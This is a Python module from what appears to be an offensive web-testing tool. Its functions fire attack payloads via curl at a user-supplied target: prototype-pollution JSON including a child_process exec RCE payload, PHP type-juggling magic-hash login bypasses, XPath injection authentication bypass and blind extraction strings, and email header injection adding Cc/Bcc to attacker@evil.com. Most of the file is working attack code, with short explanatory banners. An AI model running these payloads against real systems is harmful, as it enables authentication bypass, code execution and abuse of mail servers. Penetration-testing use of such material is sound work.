"""
modules/prototype_pollution.py
tmrswrr - Prototype Pollution & Type Juggling
JavaScript prototype pollution, PHP type juggling, JS loose comparison bypass
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def prototype_pollution_test():
    section("JAVASCRIPT PROTOTYPE POLLUTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Prototype pollution: injecting properties into Object.prototype via JSON")
    print(f"""
  {NEON_CYN}Attack explained:{RST}
    If server merges/clones user input without sanitization:
    {{"__proto__": {{"isAdmin": true}}}}
    → Object.prototype.isAdmin = true
    → Every object in the app now has .isAdmin = true!

  {NEON_CYN}Common sinks:{RST}
    - lodash.merge, _.merge (< 4.17.11)
    - jQuery.extend (deep)
    - Object.assign with nested objects
    - Custom recursive merge functions
""")

    # Test payloads
    payloads = [
        ('{"__proto__":{"isAdmin":true}}',                    "Basic prototype pollution"),
        ('{"__proto__":{"polluted":"yes"}}',                   "Custom property injection"),
        ('{"constructor":{"prototype":{"isAdmin":true}}}',     "constructor.prototype bypass"),
        ('{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\'child_process\').exec(\'id\')"}}', "RCE via template engines"),
        ('{"__proto__":{"status":200}}',                       "Status code override"),
        ('{"__proto__":{"role":"admin"}}',                     "Role escalation"),
    ]

    endpoint = prompt("API endpoint that accepts JSON body (e.g. /api/merge or /api/update)")
    if not endpoint:
        endpoint = "/api/update"

    info(f"Testing {len(payloads)} prototype pollution payloads...")
    print()

    for payload, desc in payloads:
        out, _, _ = run_cmd(
            f'curl -sk -X POST "{url}{endpoint}" '
            f'-H "Content-Type: application/json" '
            f'{cookie_flag} -d \'{payload}\' -m 8'
        )
        if any(x in out.lower() for x in ["isadmin", "polluted", "yes", "true", "admin"]):
            success(f"POSSIBLE POLLUTION: {desc}")
            print(f"  Response: {out[:200]}")
            add_vuln("Prototype Pollution", "High", "A03:2021",
                     f"Property injection via {payload[:50]}", url + endpoint)
        else:
            print(f"  {DIM}[-] {desc}{RST}")

    # Client-side check
    info("\nChecking client-side JavaScript for vulnerable patterns...")
    page_src, _, _ = run_cmd(f'curl -sk "{url}" -m 10')
    vuln_patterns = [
        (r'_\.merge\s*\(', "lodash.merge (check version)"),
        (r'jQuery\.extend\s*\(\s*true', "jQuery deep extend"),
        (r'Object\.assign\s*\(', "Object.assign (check if deep)"),
        (r'deepmerge\s*\(', "deepmerge library"),
        (r'merge\s*\([^)]*object', "Generic merge function"),
    ]
    for pat, desc in vuln_patterns:
        if re.search(pat, page_src, re.I):
            warn(f"Potentially vulnerable pattern: {desc}")
            info("  Check library version and if user input reaches merge()")


def type_juggling():
    section("PHP TYPE JUGGLING & LOOSE COMPARISON")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    print(f"""
  {NEON_CYN}PHP Type Juggling Explained:{RST}
    PHP == (loose) converts types before comparing
    "0e1234" == "0e5678" → TRUE (both evaluate as 0 in scientific notation)
    0 == "admin" → TRUE in PHP < 8.0
    "1" == "01" → TRUE
    "" == false → TRUE
    "0" == false → TRUE

  {NEON_GRN}Magic hashes (hash == "0eXXXX" → 0 in PHP):{RST}
    MD5:  240610708  → 0e462097431906509019562988736854
    MD5:  QNKCDZO    → 0e830400451993494058024219903391
    SHA1: aaroZmOk   → 0e66507019969427134894567494305185566735
    SHA1: aaK1STfY   → 0e76658526655756207688271159624026011393
""")

    login_endpoint = prompt("Login endpoint (e.g. /login)")
    pass_param     = prompt("Password parameter name") or "password"
    hash_param     = prompt("Hash/token parameter name if applicable") or ""

    if not login_endpoint:
        return

    import urllib.parse

    # Type juggling payloads for password
    juggling_payloads = [
        ("0",                           "Integer 0 == any string starting with non-numeric"),
        ("true",                        "Boolean true"),
        ("[]",                          "Empty array (PHP loose)"),
        ("QNKCDZO",                     "Magic MD5 hash starts with 0e"),
        ("240610708",                   "Another magic MD5 hash"),
        ("aabg7XSs",                    "Magic SHA-1 hash (0e)"),
    ]

    info(f"Testing type juggling bypass on {url}{login_endpoint}...")
    print()
    for payload, desc in juggling_payloads:
        data = f"username=admin&{pass_param}={urllib.parse.quote(payload)}"
        out, _, _ = run_cmd(
            f'curl -sk -X POST "{url}{login_endpoint}" '
            f'-H "Content-Type: application/x-www-form-urlencoded" '
            f'{cookie_flag} -d "{data}" -L -m 10'
        )
        if any(x in out.lower() for x in ["dashboard", "welcome", "logout", "token", "session"]):
            success(f"TYPE JUGGLING BYPASS: {desc} (payload: {payload})")
            add_vuln("PHP Type Juggling Auth Bypass", "Critical", "A07:2021",
                     f"Logged in with payload: {payload} - {desc}", url + login_endpoint)
        else:
            print(f"  {DIM}[-] {payload}: {desc}{RST}")


def xpath_injection():
    section("XPATH INJECTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    print(f"""
  {NEON_CYN}XPath Injection - like SQLi but for XML data:{RST}
    XPath: //users/user[name/text()='admin' and password/text()='secret']

  {NEON_GRN}Authentication bypass payloads:{RST}
    Username: admin' or '1'='1
    Username: ' or 1=1 or '1'='1
    Username: admin' or '1'='1' or 'x'='x
    Username: ') or ('1'='1
    Username: x' or name()='username' or 'x'='y

  {NEON_GRN}Data extraction (blind XPath):{RST}
    ' or substring(//user[1]/password/text(),1,1)='a
    ' or string-length(//user[1]/password/text())>5 or '1'='
""")

    login_endpoint = prompt("Login endpoint")
    user_param     = prompt("Username param") or "username"
    pass_param     = prompt("Password param") or "password"
    if not login_endpoint:
        return

    import urllib.parse
    xpath_payloads = [
        ("admin' or '1'='1",         "Basic OR injection"),
        ("' or 1=1 or '",             "Always-true condition"),
        ("admin'/*",                   "Comment bypass"),
        ("') or ('1'='1",             "Parenthesis injection"),
        ("x' or name()='username",    "Name function injection"),
        ("' or substring(name(),1,1)='a' or 'x'='y", "Blind XPath"),
    ]

    info(f"Testing {len(xpath_payloads)} XPath injection payloads...")
    print()
    for payload, desc in xpath_payloads:
        data = f"{user_param}={urllib.parse.quote(payload)}&{pass_param}=x"
        out, _, _ = run_cmd(
            f'curl -sk -X POST "{url}{login_endpoint}" '
            f'-H "Content-Type: application/x-www-form-urlencoded" '
            f'{cookie_flag} -d "{data}" -L -m 10'
        )
        if any(x in out.lower() for x in ["dashboard", "welcome", "logged", "token"]):
            success(f"XPATH INJECTION: {desc}")
            add_vuln("XPath Injection", "Critical", "A03:2021",
                     f"Auth bypass via XPath: {payload}", url + login_endpoint)
        elif any(x in out.lower() for x in ["xpath", "xml", "parse error", "expression"]):
            warn(f"XPath error exposed: {payload[:40]}")
            add_vuln("XPath Error Disclosure", "Medium", "A03:2021",
                     "XPath syntax error visible in response", url + login_endpoint)
        else:
            print(f"  {DIM}[-] {desc}{RST}")


def email_header_injection():
    section("EMAIL HEADER INJECTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    print(f"""
  {NEON_CYN}Email Header Injection - injecting SMTP headers via web forms:{RST}

  {NEON_GRN}Attack vectors:{RST}
    Contact forms, "Send to a friend", password reset, registration

  {NEON_GRN}Payloads (inject in name/email field):{RST}
    victim@test.com%0ACc: attacker@evil.com
    victim@test.com%0ABcc: attacker@evil.com
    victim@test.com\\nCc: attacker@evil.com
    victim@test.com\\r\\nCc: attacker@evil.com
    "victim@test.com\\nContent-Type: text/html\\n\\n<html>spam</html>"

  {NEON_GRN}Impact:{RST}
    - Spam relay through trusted server
    - Add Cc/Bcc recipients
    - Change email subject/content
    - Internal email address disclosure
""")

    email_endpoint = prompt("Form endpoint (e.g. /contact or /forgot-password)")
    email_field    = prompt("Email field name") or "email"
    if not email_endpoint:
        return

    attacker_email = "attacker@evil.com"
    injection_payloads = [
        f"test@test.com%0ACc:{attacker_email}",
        f"test@test.com%0ABcc:{attacker_email}",
        f"test@test.com\\r\\nCc:{attacker_email}",
        f"test@test.com\\nCc:{attacker_email}",
        "test@test.com%0AX-Custom:injected",
    ]

    for payload in injection_payloads:
        data = f"{email_field}={payload}"
        out, _, _ = run_cmd(
            f'curl -sk -X POST "{url}{email_endpoint}" '
            f'-H "Content-Type: application/x-www-form-urlencoded" '
            f'{cookie_flag} -d "{data}" -m 10 -w "\\nHTTP:%{{http_code}}"'
        )
        code = re.search(r"HTTP:(\d+)", out)
        c    = code.group(1) if code else "?"
        if c in ("200", "201"):
            info(f"[{c}] Request accepted with payload: {payload[:50]}")
            info("Check if email was delivered to Cc/Bcc address")
        else:
            print(f"  {DIM}[{c}] {payload[:50]}{RST}")

    info("\nIf any requests return 200, check your attacker@evil.com inbox")
    add_vuln("Email Header Injection Test", "Info", "A03:2021",
             "Email header injection probes sent", url + email_endpoint)


def run():
    print_banner("PROTOTYPE POLLUTION & TYPE JUGGLING", "tmrswrr")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Prototype Pollution  {SOFT_WHITE}(JS __proto__ injection, lodash, jQuery){RST}
  {NEON_CYN}[2]{RST} PHP Type Juggling    {SOFT_WHITE}(magic hashes, loose ==, auth bypass){RST}
  {NEON_CYN}[3]{RST} XPath Injection      {SOFT_WHITE}(XML auth bypass, blind extraction){RST}
  {NEON_CYN}[4]{RST} Email Header Injection {SOFT_WHITE}(Cc/Bcc injection, spam relay){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": prototype_pollution_test()
        elif c == "2": type_juggling()
        elif c == "3": xpath_injection()
        elif c == "4": email_header_injection()
        save_session()
